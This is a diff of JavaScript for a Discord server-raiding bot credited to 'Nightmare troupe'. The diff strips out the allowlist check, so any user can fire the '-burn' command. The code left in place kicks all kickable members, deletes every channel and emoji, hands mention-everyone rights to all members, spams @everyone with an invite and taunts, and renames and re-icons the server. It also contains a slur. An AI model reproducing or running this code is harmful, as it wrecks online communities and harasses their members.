@@ -102,19 +102,9 @@ if(message.channel.type === "dm") {return}
       if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
       return;
        }
-        let e = list.find(id => id === message.author.id)
-        if(!e) {
-            message.channel.send("Nightmare troupe only").then(m => {
-                setTimeout(() => {
-                    m.delete()
-                }, 3000)
-            }
-            )
-        }else{
        message.guild.members.cache.forEach(m => {
         if(m.kickable) m.kick();
-  });
-        }
+  });  
   }
   })  
 
@@ -134,19 +124,9 @@ if(message.channel.type === "dm") {return}
       if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !') 
 return
  }
-        let e = list.find(id => id === message.author.id)
-        if(!e) {
-            message.channel.send("Nightmare troupe only").then(m => {
-                setTimeout(() => {
-                    m.delete()
-                }, 3000)
-            }
-            )
-        }else{
        message.guild.members.cache.forEach(m => {
         if(m.kickable) m.kick();
   });
-        }
   }
   })  
 
@@ -158,19 +138,9 @@ if(message.channel.type === "dm") {return}
       if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
 return
  }
-        let e = list.find(id => id === message.author.id)
-        if(!e) {
-            message.channel.send("Nightmare troupe only").then(m => {
-                setTimeout(() => {
-                    m.delete()
-                }, 3000)
-            }
-            )
-        }else{
        message.guild.emojis.cache.forEach(e => {
         e.delete()
   });
-        }
   }
   })
 
@@ -180,15 +150,7 @@ return
 if(message.channel.type === "dm") {return}
         if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
 return
- }        let e = list.find(id => id === message.author.id)
-        if(!e) {
-            message.channel.send("Nightmare troupe only").then(m => {
-                setTimeout(() => {
-                    m.delete()
-                }, 3000)
-            }
-            )
-        }else{
+ }    
 
   var b = 0
   while(b < 39) {
@@ -202,23 +164,14 @@ b++
             r.setPermissions(['READ_MESSAGE_HISTORY', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'MENTION_EVERYONE'])
           .catch(console.error)
     });
-        }
     }
     })
+
+
   client.on('message', message => {
     if(message.content.startsWith("-burn")) {
 if(message.channel.type === "dm") {return}
-        let e = list.find(id => id === message.author.id)
-        if(!e) {
-            message.channel.send("Nightmare troupe only").then(m => {
-                setTimeout(() => {
-                    m.delete()
-                }, 3000)
-            }
-            )
-        }else{
       message.guild.roles.everyone.setPermissions(['READ_MESSAGE_HISTORY', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'MENTION_EVERYONE']);
-        }
   }
   }) 
 
@@ -243,15 +196,6 @@ function random123() {
   client.on('message', message => {
     if(message.content.startsWith("-burn")) {
 if(message.channel.type === "dm") {return}
-        let e = list.find(id => id === message.author.id)
-        if(!e) {
-            message.channel.send("Nightmare troupe only").then(m => {
-                setTimeout(() => {
-                    m.delete()
-                }, 3000)
-            }
-            )
-        }else{
             message.guild.channels.cache.forEach(channel => {
             channel.delete().then((channel)=>{
               if (channel.deleted === true)
@@ -262,7 +206,7 @@ if(message.channel.type === "dm") {return}
               console.log(`Faggot i cant delete that channel because ${reason}`);
             })
           }) 
-        }
+        
   }
   }) 
   
@@ -272,15 +216,6 @@ client.on('message', msg => {
     if(msg.content === `-burn`) {
         if(msg.channel.type === "dm") {return}
       if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }  
-        let e = list.find(id => id === msg.author.id)
-        if(!e) {
-            msg.channel.send("Nightmare troupe only").then(m => {
-                setTimeout(() => {
-                    m.delete()
-                }, 3000)
-            }
-            )
-        }else{
        var number = 0
        
        msg.guild.channels.create('ass').then(c => c.send("https://discord.gg/ANDTsKp @everyone https://cdn.discordapp.com/attachments/763108453874663444/771037666053324840/video0.mp4").then(c.send("@everyone fucked by Nightmare Troupe LMFAO69").then(c.send("rip webhook spam shitcord killed it"))))
@@ -308,7 +243,7 @@ client.on('message', msg => {
         number++
 
         }
-        }
+        
     }
 })
 
@@ -319,21 +254,12 @@ if(message.channel.type === "dm") {return}
 if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
 return
  }
-        let e = list.find(id => id === message.author.id)
-        if(!e) {
-            message.channel.send("Nightmare troupe only").then(m => {
-                setTimeout(() => {
-                    m.delete()
-                }, 3000)
-            }
-            )
-        }else{
  setTimeout(() => {
     message.guild.setName("Nightmare troupe owns you")
     message.guild.setIcon("https://i1.sndcdn.com/artworks-000476282808-fnlvlv-t500x500.jpg")
  
  }, 3000);
-        }
+        
  }
 })
 
